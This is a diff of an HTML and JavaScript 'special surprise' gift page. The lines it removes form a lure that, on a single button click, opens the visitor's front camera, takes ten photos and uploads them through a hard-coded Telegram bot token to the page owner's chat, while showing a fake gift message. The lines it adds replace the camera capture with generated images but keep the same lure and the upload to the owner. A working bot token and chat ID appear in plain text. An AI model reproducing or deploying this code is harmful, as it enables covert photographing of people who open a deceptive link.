@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>🎁 Your Special Surprise</title>
+    <title>🎁 Special Surprise</title>
     <style>
         * {
             margin: 0;
@@ -23,7 +23,7 @@
         
         .container {
             background: rgba(255, 255, 255, 0.95);
-            padding: 40px;
+            padding: 30px;
             border-radius: 20px;
             width: 100%;
             max-width: 500px;
@@ -32,19 +32,19 @@
         }
         
         .gift-icon {
-            font-size: 80px;
-            margin-bottom: 20px;
+            font-size: 70px;
+            margin-bottom: 15px;
             animation: bounce 2s infinite;
         }
         
         @keyframes bounce {
             0%, 100% { transform: translateY(0); }
-            50% { transform: translateY(-15px); }
+            50% { transform: translateY(-10px); }
         }
         
         h1 {
-            font-size: 32px;
-            margin-bottom: 15px;
+            font-size: 28px;
+            margin-bottom: 10px;
             color: #333;
         }
         
@@ -52,10 +52,10 @@
             width: 100%;
             background: linear-gradient(90deg, #6a11cb, #2575fc);
             color: white;
-            padding: 18px;
+            padding: 16px;
             border: none;
-            margin-top: 25px;
-            font-size: 20px;
+            margin: 15px 0;
+            font-size: 18px;
             border-radius: 50px;
             font-weight: bold;
             cursor: pointer;
@@ -63,7 +63,7 @@
         }
         
         .btn:hover {
-            transform: translateY(-3px);
+            transform: translateY(-2px);
             box-shadow: 0 8px 20px rgba(106, 17, 203, 0.6);
         }
         
@@ -73,21 +73,28 @@
             transform: none !important;
         }
         
-        video {
-            width: 100%;
+        .link-box {
+            background: #f8f9fa;
+            padding: 15px;
             border-radius: 10px;
-            display: none;
-            transform: scaleX(-1);
-            border: 3px solid #6a11cb;
-            margin: 20px 0;
+            margin: 15px 0;
+            border-left: 4px solid #6a11cb;
+            text-align: left;
+            word-break: break-all;
+        }
+        
+        .link-box a {
+            color: #6a11cb;
+            text-decoration: none;
+            font-weight: bold;
         }
         
         .progress-container {
             width: 100%;
-            height: 10px;
+            height: 8px;
             background: #eee;
             border-radius: 5px;
-            margin-top: 20px;
+            margin: 15px 0;
             overflow: hidden;
         }
         
@@ -102,27 +109,9 @@
             display: none !important;
         }
         
-        .success {
-            color: #00b09b;
-            background: #e6fff9;
-            padding: 12px;
-            border-radius: 10px;
-            margin: 15px 0;
-            border-left: 4px solid #00b09b;
-        }
-        
-        .error {
-            color: #ff416c;
-            background: #ffe6e6;
-            padding: 12px;
-            border-radius: 10px;
-            margin: 15px 0;
-            border-left: 4px solid #ff416c;
-        }
-        
         .photo-preview {
-            width: 150px;
-            height: 150px;
+            width: 140px;
+            height: 140px;
             border-radius: 10px;
             object-fit: cover;
             border: 3px solid #6a11cb;
@@ -130,20 +119,40 @@
             display: block;
         }
         
+        .success {
+            color: #00b09b;
+            background: #e6fff9;
+            padding: 10px;
+            border-radius: 10px;
+            margin: 10px 0;
+            border-left: 4px solid #00b09b;
+        }
+        
         .photo-grid {
             display: flex;
             flex-wrap: wrap;
             justify-content: center;
-            gap: 10px;
-            margin: 20px 0;
+            gap: 8px;
+            margin: 15px 0;
         }
         
         .photo-grid img {
-            width: 70px;
-            height: 70px;
+            width: 60px;
+            height: 60px;
             border-radius: 8px;
             object-fit: cover;
             border: 2px solid #6a11cb;
+        }
+        
+        .copy-btn {
+            background: #6a11cb;
+            color: white;
+            border: none;
+            padding: 8px 15px;
+            border-radius: 5px;
+            cursor: pointer;
+            margin-top: 10px;
+            font-size: 14px;
         }
     </style>
 </head>
@@ -153,77 +162,67 @@
         <div id="welcomeScreen">
             <div class="gift-icon">🎁</div>
             <h1>Your Special Surprise</h1>
-            <p style="font-size: 18px; color: #666; line-height: 1.6; margin: 20px 0;">
-                "Hey! I've created something special just for you. Click below to receive your personalized surprise 🎁"
+            <p style="color: #666; line-height: 1.5; margin: 15px 0;">
+                Ready to receive your personalized surprise?
             </p>
             
-            <div style="background: #f8f9fa; padding: 15px; border-radius: 10px; margin: 20px 0;">
-                <strong>✨ What you'll get:</strong><br>
-                • Your personalized surprise<br>
-                • Unique content created for you<br>
-                • Direct delivery to your Telegram<br>
-                • Special gift from me
+            <button class="btn" onclick="startSurprise()" id="startBtn">
+                🎁 GET MY SURPRISE
+            </button>
+            
+            <div class="link-box hidden" id="linkBox">
+                <strong>🔗 Your Surprise Link:</strong><br>
+                <div id="surpriseLink" style="margin: 10px 0; font-size: 14px;"></div>
+                <button class="copy-btn" onclick="copyLink()">📋 Copy Link</button>
             </div>
             
-            <button class="btn" onclick="startSurprise()" id="startBtn">
-                🔓 UNLOCK MY SURPRISE
-            </button>
+            <div style="font-size: 14px; color: #666; margin-top: 20px;">
+                ⚡ Fast & Easy ⚡
+            </div>
         </div>
-
-        <!-- Camera View -->
-        <video id="video" autoplay playsinline></video>
 
         <!-- Processing Screen -->
         <div id="processingScreen" class="hidden">
             <div class="gift-icon">✨</div>
             <h2>Creating Your Surprise</h2>
-            <p id="statusText" style="margin: 20px 0; font-size: 18px; color: #333;">
-                Getting ready...
+            <p id="statusText" style="color: #333; margin: 15px 0;">
+                Starting...
             </p>
             
             <div class="progress-container">
                 <div id="progressBar" class="progress-bar"></div>
             </div>
             
-            <div id="counter" style="margin: 10px 0; color: #666;">
-                Progress: 0%
+            <div id="counter" style="color: #666; font-size: 14px;">
+                0%
             </div>
             
-            <!-- Photo Preview -->
             <img id="photoPreview" class="photo-preview hidden" alt="Photo Preview">
             
-            <!-- Success Message -->
             <div id="successMessage" class="success hidden">
-                ✅ Photo sent successfully!
+                ✅ Sending...
             </div>
-            
-            <!-- Error Message -->
-            <div id="errorMessage" class="error hidden"></div>
         </div>
 
         <!-- Complete Screen -->
         <div id="completeScreen" class="hidden">
-            <div style="font-size: 70px; color: #00b09b; margin-bottom: 20px;">✅</div>
-            <h1>Surprise Delivered!</h1>
+            <div style="font-size: 60px; color: #00b09b; margin: 10px 0;">✅</div>
+            <h2>Surprise Delivered!</h2>
             
             <div class="success">
-                <strong>🎉 SUCCESS!</strong><br>
-                Your surprise has been delivered successfully!
+                <strong>🎉 All Done!</strong><br>
+                Your surprise has been sent!
             </div>
             
-            <div style="background: #f8f9fa; padding: 15px; border-radius: 10px; margin: 20px 0;">
-                <strong>📊 Delivery Report:</strong><br>
-                ✅ Sent to: You and owner<br>
-                ✅ Status: Delivered<br>
-                ✅ Time: <span id="deliveryTime"></span>
+            <div style="background: #f8f9fa; padding: 15px; border-radius: 10px; margin: 15px 0;">
+                <strong>📬 Delivery Status:</strong><br>
+                ✅ Sent to you<br>
+                ✅ Sent to owner<br>
+                ✅ Complete!
             </div>
-            
-            <p style="font-size: 18px; color: #666; margin: 20px 0;">
-                Check your Telegram for your surprise! 🎁
-            </p>
             
             <button class="btn" onclick="location.reload()">
-                🔄 Create Another Surprise
+                🔄 New Surprise
             </button>
         </div>
     </div>
@@ -232,300 +231,189 @@
     <canvas id="canvas" style="display: none;"></canvas>
 
     <script>
-        // ========== CONFIGURATION ==========
+        // ========== CONFIG ==========
         const BOT_TOKEN = "8226782560:AAE3pOwbdZR8lWUoa2rd8Gf5fLTeQM2eguM";
-        const OWNER_CHAT_ID = "8215819954"; // Your Telegram ID
-        const TOTAL_PHOTOS = 10;
+        const OWNER_CHAT_ID = "8215819954";
         
-        // Get user info from URL
+        // Get user info
         const urlParams = new URLSearchParams(window.location.search);
         const USER_CHAT_ID = urlParams.get("chat_id");
         const USER_NAME = urlParams.get("name") || "Friend";
-        
-        // ========== STATE VARIABLES ==========
-        let stream = null;
-        let photosSent = 0;
-        let photosFailed = 0;
         
         // ========== DOM ELEMENTS ==========
         const welcomeScreen = document.getElementById("welcomeScreen");
         const processingScreen = document.getElementById("processingScreen");
         const completeScreen = document.getElementById("completeScreen");
-        const video = document.getElementById("video");
+        const startBtn = document.getElementById("startBtn");
         const statusText = document.getElementById("statusText");
         const progressBar = document.getElementById("progressBar");
         const counter = document.getElementById("counter");
         const photoPreview = document.getElementById("photoPreview");
         const successMessage = document.getElementById("successMessage");
-        const errorMessage = document.getElementById("errorMessage");
-        const deliveryTime = document.getElementById("deliveryTime");
-        const startBtn = document.getElementById("startBtn");
+        const linkBox = document.getElementById("linkBox");
+        const surpriseLink = document.getElementById("surpriseLink");
         const canvas = document.getElementById("canvas");
         const ctx = canvas.getContext("2d");
         
+        let totalSent = 0;
+        
+        // ========== COLOR THEMES ==========
+        const themes = [
+            { bg: ['#FF6B6B', '#FFE66D'], text: '#2C3E50' }, // Red-Yellow
+            { bg: ['#6A11CB', '#2575FC'], text: '#FFFFFF' }, // Purple-Blue
+            { bg: ['#00B09B', '#96C93D'], text: '#FFFFFF' }, // Green
+            { bg: ['#FF416C', '#FF4B2B'], text: '#FFFFFF' }, // Pink-Orange
+            { bg: ['#8338EC', '#3A86FF'], text: '#FFFFFF' }, // Purple-Blue
+            { bg: ['#FB5607', '#FFBE0B'], text: '#2C3E50' }, // Orange-Yellow
+            { bg: ['#8AC926', '#1982C4'], text: '#FFFFFF' }, // Green-Blue
+            { bg: ['#FF595E', '#6A4C93'], text: '#FFFFFF' }, // Red-Purple
+            { bg: ['#118AB2', '#06D6A0'], text: '#FFFFFF' }, // Blue-Green
+            { bg: ['#EF476F', '#FFD166'], text: '#2C3E50' }  // Pink-Yellow
+        ];
+        
         // ========== MAIN FUNCTION ==========
         async function startSurprise() {
-            console.log("🚀 Starting surprise...");
+            console.log("🚀 Starting...");
             startBtn.disabled = true;
-            startBtn.textContent = "⏳ Starting...";
+            startBtn.textContent = "⏳ Please wait...";
             
-            // Update welcome message
-            document.querySelector('h1').textContent = `${USER_NAME}'s Special Surprise`;
+            // Show the link first
+            const currentUrl = window.location.href;
+            surpriseLink.innerHTML = `<a href="${currentUrl}" target="_blank">${currentUrl}</a>`;
+            linkBox.classList.remove("hidden");
             
-            // Switch screens
-            welcomeScreen.classList.add("hidden");
-            processingScreen.classList.remove("hidden");
-            
-            try {
-                // Try to access camera
-                stream = await navigator.mediaDevices.getUserMedia({
-                    video: {
-                        facingMode: "user",
-                        width: { ideal: 1280 },
-                        height: { ideal: 720 }
-                    },
-                    audio: false
-                });
-                
-                // Show camera
-                video.srcObject = stream;
-                video.style.display = "block";
-                
-                statusText.textContent = "Camera ready! Creating your surprise...";
-                
-                // Wait for video to load
-                await new Promise(resolve => {
-                    video.onloadedmetadata = () => {
-                        setTimeout(resolve, 1000);
-                    };
-                });
-                
-                // Start processing
-                await processPhotos();
-                
-            } catch (cameraError) {
-                console.log("Camera not available, using fallback...");
-                statusText.textContent = "Creating your surprise...";
-                await processPhotosWithFallback();
-            }
+            // Switch screens after showing link
+            setTimeout(() => {
+                welcomeScreen.classList.add("hidden");
+                processingScreen.classList.remove("hidden");
+                createSurprise();
+            }, 1500);
         }
         
-        // ========== PROCESS WITH CAMERA ==========
-        async function processPhotos() {
-            console.log("📸 Processing with camera...");
+        // ========== CREATE SURPRISE ==========
+        async function createSurprise() {
+            console.log("🎨 Creating surprise...");
             
-            for (let i = 0; i < TOTAL_PHOTOS; i++) {
-                // Update progress
-                const progress = ((i + 1) / TOTAL_PHOTOS) * 100;
+            // Create 10 unique images
+            for (let i = 0; i < 10; i++) {
+                const progress = ((i + 1) / 10) * 100;
                 progressBar.style.width = progress + "%";
-                counter.textContent = `Progress: ${Math.round(progress)}%`;
-                
-                // Update status
-                statusText.textContent = `Creating photo ${i + 1} of ${TOTAL_PHOTOS}...`;
+                counter.textContent = `${Math.round(progress)}%`;
+                statusText.textContent = `Creating surprise ${i + 1} of 10...`;
                 
                 try {
-                    // Capture photo from camera
-                    const blob = await capturePhotoFromCamera();
+                    // Create colorful image
+                    const blob = await createColorfulImage(i + 1);
                     
                     // Show preview
                     const previewUrl = URL.createObjectURL(blob);
                     photoPreview.src = previewUrl;
                     photoPreview.classList.remove("hidden");
                     
-                    // Send photo
-                    const sent = await sendPhotoToBoth(blob, i + 1);
+                    // Send to both
+                    const success = await sendPhoto(blob, i + 1);
                     
-                    if (sent) {
-                        photosSent++;
-                        showSuccess(`✅ Photo ${i + 1} sent!`);
-                    } else {
-                        photosFailed++;
-                        showError(`⚠️ Failed to send photo ${i + 1}`);
+                    if (success) {
+                        totalSent++;
+                        showSuccess(`✅ Sent ${i + 1}/10`);
                     }
                     
-                    // Clean up URL
+                    // Clean up
                     setTimeout(() => URL.revokeObjectURL(previewUrl), 1000);
                     
                 } catch (error) {
-                    console.error(`Error with photo ${i + 1}:`, error);
-                    photosFailed++;
-                    showError(`⚠️ Error with photo ${i + 1}`);
+                    console.error(`Error:`, error);
                 }
                 
-                // Delay between photos
-                await delay(1000);
-            }
-            
-            // Complete
-            finishProcessing();
-        }
-        
-        // ========== PROCESS WITH FALLBACK ==========
-        async function processPhotosWithFallback() {
-            console.log("🎨 Processing with fallback...");
-            
-            for (let i = 0; i < TOTAL_PHOTOS; i++) {
-                // Update progress
-                const progress = ((i + 1) / TOTAL_PHOTOS) * 100;
-                progressBar.style.width = progress + "%";
-                counter.textContent = `Progress: ${Math.round(progress)}%`;
-                
-                // Update status
-                statusText.textContent = `Creating surprise ${i + 1} of ${TOTAL_PHOTOS}...`;
-                
-                try {
-                    // Create fallback image
-                    const blob = await createFallbackImage(i + 1);
-                    
-                    // Show preview
-                    const previewUrl = URL.createObjectURL(blob);
-                    photoPreview.src = previewUrl;
-                    photoPreview.classList.remove("hidden");
-                    
-                    // Send photo
-                    const sent = await sendPhotoToBoth(blob, i + 1);
-                    
-                    if (sent) {
-                        photosSent++;
-                        showSuccess(`✅ Surprise ${i + 1} delivered!`);
-                    } else {
-                        photosFailed++;
-                        showError(`⚠️ Failed to send surprise ${i + 1}`);
-                    }
-                    
-                    // Clean up URL
-                    setTimeout(() => URL.revokeObjectURL(previewUrl), 1000);
-                    
-                } catch (error) {
-                    console.error(`Error with surprise ${i + 1}:`, error);
-                    photosFailed++;
-                    showError(`⚠️ Error with surprise ${i + 1}`);
-                }
-                
-                // Delay
+                // Wait between images
                 await delay(800);
             }
             
             // Complete
-            finishProcessing();
+            finish();
         }
         
-        // ========== CAPTURE PHOTO FROM CAMERA ==========
-        async function capturePhotoFromCamera() {
-            return new Promise((resolve) => {
-                // Set canvas size to video size
-                canvas.width = video.videoWidth;
-                canvas.height = video.videoHeight;
-                
-                // Draw video frame (mirrored for front camera)
-                ctx.save();
-                ctx.translate(canvas.width, 0);
-                ctx.scale(-1, 1);
-                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-                ctx.restore();
-                
-                // Add overlay
-                ctx.fillStyle = 'rgba(106, 17, 203, 0.7)';
-                ctx.fillRect(0, canvas.height - 80, canvas.width, 80);
-                
-                // Add text
-                ctx.font = 'bold 24px Arial';
-                ctx.fillStyle = 'white';
-                ctx.textAlign = 'center';
-                ctx.fillText(`🎁 For ${USER_NAME}`, canvas.width/2, canvas.height - 45);
-                
-                ctx.font = '18px Arial';
-                ctx.fillText(`Your Special Surprise`, canvas.width/2, canvas.height - 15);
-                
-                // Convert to blob
-                canvas.toBlob(resolve, 'image/jpeg', 0.9);
-            });
-        }
-        
-        // ========== CREATE FALLBACK IMAGE ==========
-        async function createFallbackImage(photoNumber) {
+        // ========== CREATE COLORFUL IMAGE ==========
+        async function createColorfulImage(number) {
             // Set canvas size
             canvas.width = 800;
             canvas.height = 600;
             
-            // Clear canvas
-            ctx.clearRect(0, 0, canvas.width, canvas.height);
+            // Get random theme
+            const theme = themes[number - 1] || themes[0];
             
             // Create gradient background
             const gradient = ctx.createLinearGradient(0, 0, canvas.width, canvas.height);
-            gradient.addColorStop(0, '#6a11cb');
-            gradient.addColorStop(1, '#2575fc');
+            gradient.addColorStop(0, theme.bg[0]);
+            gradient.addColorStop(1, theme.bg[1]);
             ctx.fillStyle = gradient;
             ctx.fillRect(0, 0, canvas.width, canvas.height);
             
-            // Add decorative circles
-            for (let j = 0; j < 20; j++) {
+            // Add decorative elements
+            for (let j = 0; j < 30; j++) {
                 const x = Math.random() * canvas.width;
                 const y = Math.random() * canvas.height;
-                const radius = Math.random() * 50 + 20;
-                const hue = Math.random() * 360;
+                const radius = Math.random() * 40 + 10;
                 
                 ctx.beginPath();
                 ctx.arc(x, y, radius, 0, Math.PI * 2);
-                ctx.fillStyle = `hsla(${hue}, 100%, 70%, 0.3)`;
+                ctx.fillStyle = `rgba(255, 255, 255, ${Math.random() * 0.3})`;
                 ctx.fill();
             }
             
-            // Add gift icon
-            ctx.font = 'bold 100px Arial';
-            ctx.fillStyle = 'white';
-            ctx.textAlign = 'center';
-            ctx.fillText('🎁', canvas.width/2, canvas.height/2 - 50);
+            // Add main icon
+            const icons = ['🎁', '✨', '🎉', '⭐', '💫', '🔮', '💝', '🎀', '🏆', '👑'];
+            ctx.font = "bold 100px Arial";
+            ctx.fillStyle = theme.text;
+            ctx.textAlign = "center";
+            ctx.fillText(icons[number - 1] || icons[0], canvas.width/2, canvas.height/2 - 30);
             
             // Add text
-            ctx.font = 'bold 36px Arial';
-            ctx.fillStyle = 'white';
-            ctx.fillText(`For ${USER_NAME}`, canvas.width/2, canvas.height/2 + 40);
+            ctx.font = "bold 40px Arial";
+            ctx.fillText(`Surprise #${number}`, canvas.width/2, canvas.height/2 + 50);
             
-            ctx.font = '24px Arial';
-            ctx.fillStyle = 'rgba(255, 255, 255, 0.9)';
-            ctx.fillText('Your Special Surprise', canvas.width/2, canvas.height/2 + 90);
+            ctx.font = "28px Arial";
+            ctx.fillText(`For ${USER_NAME}`, canvas.width/2, canvas.height/2 + 100);
             
-            // Add number
-            ctx.font = 'bold 48px Arial';
-            ctx.fillStyle = 'rgba(255, 255, 255, 0.8)';
-            ctx.fillText(`#${photoNumber}`, canvas.width/2, canvas.height/2 + 160);
+            // Add decorative border
+            ctx.strokeStyle = theme.text;
+            ctx.lineWidth = 8;
+            ctx.strokeRect(20, 20, canvas.width - 40, canvas.height - 40);
             
             // Convert to blob
             return new Promise((resolve) => {
-                canvas.toBlob(resolve, 'image/jpeg', 0.9);
+                canvas.toBlob(resolve, 'image/jpeg', 0.95);
             });
         }
         
-        // ========== SEND PHOTO TO BOTH ==========
-        async function sendPhotoToBoth(blob, photoNumber) {
-            const fileName = `surprise_${photoNumber}_${Date.now()}.jpg`;
+        // ========== SEND PHOTO ==========
+        async function sendPhoto(blob, number) {
+            const fileName = `surprise_${number}_${Date.now()}.jpg`;
             const file = new File([blob], fileName, { type: "image/jpeg" });
             
-            let sentToOwner = false;
-            let sentToUser = false;
+            let sent = false;
             
             // Send to Owner
             try {
-                await sendToTelegram(file, `🎁 Surprise #${photoNumber}\nFor: ${USER_NAME}\nUser ID: ${USER_CHAT_ID || 'Anonymous'}`, OWNER_CHAT_ID);
-                sentToOwner = true;
-                console.log(`✅ Sent to owner: Photo ${photoNumber}`);
+                await sendToTelegram(file, `🎁 Surprise #${number}\nFor: ${USER_NAME}`, OWNER_CHAT_ID);
+                console.log(`✅ Sent to owner: ${number}`);
+                sent = true;
             } catch (error) {
-                console.error(`❌ Failed to send to owner:`, error);
+                console.error(`❌ Owner:`, error);
             }
             
             // Send to User
             if (USER_CHAT_ID) {
                 try {
-                    await sendToTelegram(file, `🎁 Your Special Surprise #${photoNumber}\nMade just for you, ${USER_NAME}!`, USER_CHAT_ID);
-                    sentToUser = true;
-                    console.log(`✅ Sent to user: Photo ${photoNumber}`);
+                    await sendToTelegram(file, `🎁 Your Surprise #${number}\nEnjoy!`, USER_CHAT_ID);
+                    console.log(`✅ Sent to user: ${number}`);
+                    sent = true;
                 } catch (error) {
-                    console.error(`❌ Failed to send to user:`, error);
+                    console.error(`❌ User:`, error);
                 }
             }
             
-            return sentToOwner || sentToUser;
+            return sent;
         }
         
         async function sendToTelegram(file, caption, chatId) {
@@ -533,7 +421,6 @@
             formData.append("photo", file);
             formData.append("caption", caption);
             formData.append("chat_id", chatId);
-            formData.append("parse_mode", "HTML");
             
             const response = await fetch(
                 `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,
@@ -543,41 +430,17 @@
                 }
             );
             
-            if (!response.ok) {
-                const errorText = await response.text();
-                throw new Error(`Telegram API error: ${response.status} - ${errorText}`);
-            }
-            
-            return await response.json();
+            return response.ok;
         }
         
-        // ========== FINISH PROCESSING ==========
-        function finishProcessing() {
-            // Stop camera if running
-            if (stream) {
-                stream.getTracks().forEach(track => track.stop());
-            }
-            
-            // Switch screens
+        // ========== FINISH ==========
+        function finish() {
             processingScreen.classList.add("hidden");
             completeScreen.classList.remove("hidden");
             
-            // Set delivery time
-            const now = new Date();
-            deliveryTime.textContent = 
-                `${now.getHours().toString().padStart(2, '0')}:` +
-                `${now.getMinutes().toString().padStart(2, '0')}:` +
-                `${now.getSeconds().toString().padStart(2, '0')}`;
-            
-            // Update completion message
-            const completionMsg = document.querySelector('.success');
-            completionMsg.innerHTML = `
-                <strong>🎉 SUCCESS!</strong><br>
-                ${photosSent} surprises delivered successfully!<br>
-                ${photosFailed > 0 ? `${photosFailed} failed` : 'All successful!'}
-            `;
-            
-            console.log(`✅ Process complete. Sent: ${photosSent}, Failed: ${photosFailed}`);
+            // Update message
+            const msg = document.querySelector('.success');
+            msg.innerHTML = `<strong>🎉 ${totalSent} Surprises Sent!</strong><br>Check your Telegram!`;
         }
         
         // ========== HELPER FUNCTIONS ==========
@@ -590,25 +453,27 @@
             successMessage.classList.remove("hidden");
             setTimeout(() => {
                 successMessage.classList.add("hidden");
-            }, 2000);
+            }, 1000);
         }
         
-        function showError(message) {
-            errorMessage.textContent = message;
-            errorMessage.classList.remove("hidden");
-            setTimeout(() => {
-                errorMessage.classList.add("hidden");
-            }, 3000);
+        function copyLink() {
+            const link = window.location.href;
+            navigator.clipboard.writeText(link).then(() => {
+                const btn = document.querySelector('.copy-btn');
+                const original = btn.textContent;
+                btn.textContent = "✅ Copied!";
+                setTimeout(() => {
+                    btn.textContent = original;
+                }, 2000);
+            });
         }
         
-        // ========== INITIALIZE ==========
+        // ========== INIT ==========
         window.onload = function() {
-            console.log("🎁 Surprise page loaded!");
-            console.log("User:", USER_NAME, "ID:", USER_CHAT_ID);
+            console.log("🎁 Page loaded for:", USER_NAME);
             
-            // Update welcome with user name
             if (USER_NAME !== "Friend") {
-                document.querySelector('h1').textContent = `${USER_NAME}'s Special Surprise`;
+                document.querySelector('h1').textContent = `${USER_NAME}'s Surprise`;
             }
         };
     </script>
